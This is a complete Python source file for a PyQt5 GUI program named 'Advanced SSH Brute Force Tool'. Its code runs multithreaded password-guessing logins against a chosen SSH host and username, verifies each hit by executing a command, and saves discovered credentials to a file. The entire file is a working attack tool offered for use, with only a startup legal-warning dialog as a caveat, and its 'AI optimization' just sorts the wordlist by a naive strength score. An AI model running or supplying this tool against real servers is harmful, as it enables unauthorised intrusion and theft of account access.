import sys
import os
import time
import threading
import paramiko
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel,
    QLineEdit, QTextEdit, QFileDialog, QCheckBox, QMessageBox, QProgressBar,
    QGroupBox, QSpinBox, QListWidget, QSplitter, QFormLayout
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer
from PyQt5.QtGui import QFont

class SSHBruteWorker(QThread):
    log_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int, int)
    result_signal = pyqtSignal(str, str, str)
    status_signal = pyqtSignal(str)

    def __init__(self, host, port, username, wordlist_path, threads=5, timeout=10, use_ai=False):
        super().__init__()
        self.host = host
        self.port = port
        self.username = username
        self.wordlist_path = wordlist_path
        self.threads = threads
        self.timeout = timeout
        self.use_ai = use_ai
        self.running = True
        self.found_password = None
        self.tested_count = 0
        self.total_passwords = 0

    def calculate_password_strength(self, password):
        score = 0
        if len(password) >= 8: score += 1
        if any(c.islower() for c in password): score += 1
        if any(c.isupper() for c in password): score += 1
        if any(c.isdigit() for c in password): score += 1
        if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?`~' for c in password): score += 1
        return score

    def smart_password_sort(self, passwords):
        return sorted(passwords, key=lambda x: self.calculate_password_strength(x), reverse=True)

    def test_ssh_connection(self, password):
        if not self.running or self.found_password:
            return False

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                self.host, 
                port=int(self.port), 
                username=self.username, 
                password=password, 
                timeout=self.timeout,
                banner_timeout=30
            )
            
            stdin, stdout, stderr = ssh.exec_command('echo "connection_test"', timeout=5)
            output = stdout.read().decode().strip()
            
            ssh.close()
            
            if output == "connection_test":
                self.found_password = password
                self.result_signal.emit(self.host, self.username, password)
                self.log_signal.emit(f"SUCCESS! Password found: {password}", "success")
                return True
                
        except paramiko.AuthenticationException:
            self.log_signal.emit(f"Failed: {password}", "failure")
        except paramiko.SSHException as e:
            self.log_signal.emit(f"SSH Error: {str(e)}", "warning")
        except Exception as e:
            self.log_signal.emit(f"Connection Error: {str(e)}", "warning")
        
        self.tested_count += 1
        self.progress_signal.emit(self.tested_count, self.total_passwords)
        return False

    def worker_thread(self, password_chunk):
        for password in password_chunk:
            if not self.running or self.found_password:
                break
            if self.test_ssh_connection(password.strip()):
                break
            time.sleep(0.1)

    def run(self):
        try:
            if not os.path.exists(self.wordlist_path):
                self.log_signal.emit("Wordlist file not found!", "error")
                return

            with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]

            if not passwords:
                self.log_signal.emit("No passwords found in wordlist!", "error")
                return

            self.total_passwords = len(passwords)
            self.log_signal.emit(f"Loaded {self.total_passwords} passwords", "info")

            if self.use_ai:
                self.log_signal.emit("AI optimization enabled - sorting passwords...", "info")
                passwords = self.smart_password_sort(passwords)

            chunk_size = max(1, len(passwords) // self.threads)
            chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]

            self.log_signal.emit(f"Starting brute force with {self.threads} threads...", "info")
            self.status_signal.emit("running")

            threads = []
            for chunk in chunks:
                if self.running and not self.found_password:
                    thread = threading.Thread(target=self.worker_thread, args=(chunk,))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)

            for thread in threads:
                thread.join()

            if not self.found_password and self.running:
                self.log_signal.emit("No valid password found in wordlist", "info")

            self.status_signal.emit("completed")

        except Exception as e:
            self.log_signal.emit(f"Critical error: {str(e)}", "error")
            self.status_signal.emit("error")

    def stop(self):
        self.running = False
        self.status_signal.emit("stopped")

class BruteForceGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.workers = []
        self.current_worker = None
        self.setup_ui()

    def setup_ui(self):
        self.setWindowTitle("Advanced SSH Brute Force Tool")
        self.setGeometry(100, 100, 900, 700)

        main_layout = QHBoxLayout()
        splitter = QSplitter(Qt.Horizontal)

        left_widget = QWidget()
        left_layout = QVBoxLayout()
        left_widget.setMaximumWidth(400)

        target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()

        self.host_input = QLineEdit()
        self.host_input.setPlaceholderText("192.168.1.1 or domain.com")
        target_layout.addRow("Host:", self.host_input)

        self.port_input = QLineEdit("22")
        target_layout.addRow("Port:", self.port_input)

        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("root or admin")
        target_layout.addRow("Username:", self.username_input)

        target_group.setLayout(target_layout)
        left_layout.addWidget(target_group)

        attack_group = QGroupBox("Attack Configuration")
        attack_layout = QFormLayout()

        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 50)
        self.threads_spin.setValue(10)
        attack_layout.addRow("Threads:", self.threads_spin)

        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(5, 60)
        self.timeout_spin.setValue(10)
        attack_layout.addRow("Timeout (s):", self.timeout_spin)

        self.ai_checkbox = QCheckBox("Enable AI Optimization")
        attack_layout.addRow("AI:", self.ai_checkbox)

        attack_group.setLayout(attack_layout)
        left_layout.addWidget(attack_group)

        wordlist_group = QGroupBox("Wordlist")
        wordlist_layout = QVBoxLayout()

        self.wordlist_btn = QPushButton("Select Wordlist File")
        self.wordlist_btn.clicked.connect(self.load_wordlist)
        wordlist_layout.addWidget(self.wordlist_btn)

        self.wordlist_label = QLabel("No wordlist selected")
        self.wordlist_label.setWordWrap(True)
        wordlist_layout.addWidget(self.wordlist_label)

        wordlist_group.setLayout(wordlist_layout)
        left_layout.addWidget(wordlist_group)

        button_layout = QHBoxLayout()

        self.start_btn = QPushButton("Start Attack")
        self.start_btn.clicked.connect(self.start_attack)
        self.start_btn.setStyleSheet("QPushButton { background-color: #4CAF50; color: white; }")
        button_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("Stop Attack")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet("QPushButton { background-color: #f44336; color: white; }")
        button_layout.addWidget(self.stop_btn)

        left_layout.addLayout(button_layout)

        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        left_layout.addWidget(self.progress_bar)

        left_layout.addStretch()
        left_widget.setLayout(left_layout)

        right_widget = QWidget()
        right_layout = QVBoxLayout()

        log_group = QGroupBox("Attack Log")
        log_layout = QVBoxLayout()

        self.output_log = QTextEdit()
        self.output_log.setReadOnly(True)
        self.output_log.setFont(QFont("Courier", 9))
        log_layout.addWidget(self.output_log)

        log_group.setLayout(log_layout)
        right_layout.addWidget(log_group)

        results_group = QGroupBox("Discovered Credentials")
        results_layout = QVBoxLayout()

        self.results_list = QListWidget()
        results_layout.addWidget(self.results_list)

        results_group.setLayout(results_layout)
        right_layout.addWidget(results_group)

        right_widget.setLayout(right_layout)

        splitter.addWidget(left_widget)
        splitter.addWidget(right_widget)
        splitter.setSizes([300, 600])

        main_layout.addWidget(splitter)
        self.setLayout(main_layout)

        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self.update_status)
        self.status_timer.start(1000)

    def load_wordlist(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, 
            "Select Wordlist File", 
            "", 
            "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.wordlist_path = file_path
            file_name = os.path.basename(file_path)
            
            file_size = os.path.getsize(file_path)
            size_kb = file_size / 1024
            size_mb = size_kb / 1024
            
            if size_mb > 1:
                size_str = f"{size_mb:.1f} MB"
            else:
                size_str = f"{size_kb:.1f} KB"
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                line_count = sum(1 for _ in f)
            
            self.wordlist_label.setText(f"{file_name}\n{line_count:,} passwords\n{size_str}")
            self.log_message(f"Wordlist loaded: {file_name} ({line_count:,} passwords)", "info")

    def log_message(self, message, msg_type="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if msg_type == "success":
            color = "green"
            prefix = ""
        elif msg_type == "error":
            color = "red"
            prefix = ""
        elif msg_type == "warning":
            color = "orange"
            prefix = ""
        else:
            color = "blue"
            prefix = ""
        
        formatted_message = f'<span style="color: {color};"><b>[{timestamp}]</b> {prefix} {message}</span>'
        self.output_log.append(formatted_message)
        
        self.output_log.verticalScrollBar().setValue(
            self.output_log.verticalScrollBar().maximum()
        )

    def start_attack(self):
        host = self.host_input.text().strip()
        port = self.port_input.text().strip() or "22"
        username = self.username_input.text().strip()
        use_ai = self.ai_checkbox.isChecked()
        threads = self.threads_spin.value()
        timeout = self.timeout_spin.value()

        if not all([host, username, hasattr(self, 'wordlist_path')]):
            QMessageBox.warning(
                self, 
                "Input Error", 
                "Please fill all fields:\n- Target Host\n- Username\n- Select Wordlist"
            )
            return

        try:
            port_int = int(port)
            if not (1 <= port_int <= 65535):
                raise ValueError("Invalid port")
        except ValueError:
            QMessageBox.warning(self, "Input Error", "Port must be a number between 1-65535")
            return

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)

        self.current_worker = SSHBruteWorker(
            host, port, username, self.wordlist_path, threads, timeout, use_ai
        )
        self.current_worker.log_signal.connect(self.log_message)
        self.current_worker.progress_signal.connect(self.update_progress)
        self.current_worker.result_signal.connect(self.add_result)
        self.current_worker.status_signal.connect(self.handle_worker_status)
        
        self.workers.append(self.current_worker)
        self.current_worker.start()

        self.log_message(f"Starting attack on {host}:{port} as {username}", "info")

    def stop_attack(self):
        if self.current_worker:
            self.current_worker.stop()
            self.log_message("Attack stopped by user", "warning")

    def update_progress(self, current, total):
        if total > 0:
            percentage = int((current / total) * 100)
            self.progress_bar.setValue(percentage)
            self.progress_bar.setFormat(f"{current}/{total} ({percentage}%)")

    def add_result(self, host, username, password):
        result_text = f"Host: {host} | User: {username} | Password: {password}"
        self.results_list.addItem(f"{result_text}")
        
        try:
            with open("successful_logins.txt", "a") as f:
                f.write(f"{datetime.now()} - {result_text}\n")
        except:
            pass

    def handle_worker_status(self, status):
        if status in ["completed", "stopped", "error"]:
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            
            if status == "completed":
                self.log_message("Attack completed successfully", "success")
            elif status == "stopped":
                self.log_message("Attack stopped", "warning")
            elif status == "error":
                self.log_message("Attack finished with errors", "error")

    def update_status(self):
        pass

    def closeEvent(self, event):
        for worker in self.workers:
            if worker and worker.isRunning():
                worker.stop()
                worker.wait(2000)
        
        if self.results_list.count() > 0:
            QMessageBox.information(
                self, 
                "Attack Summary", 
                f"Found {self.results_list.count()} valid credential(s)!"
            )
        
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    warning_msg = QMessageBox()
    warning_msg.setIcon(QMessageBox.Warning)
    warning_msg.setWindowTitle("Security Warning")
    warning_msg.setText(
        "LEGAL WARNING:\n\n"
        "This tool is for educational and authorized penetration testing purposes only.\n\n"
        "Unauthorized use against systems you don't own or have explicit permission to test is ILLEGAL.\n\n"
        "You are solely responsible for how you use this tool."
    )
    warning_msg.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
    
    if warning_msg.exec_() == QMessageBox.Cancel:
        sys.exit(0)
    
    window = BruteForceGUI()
    window.show()
    
    sys.exit(app.exec_())
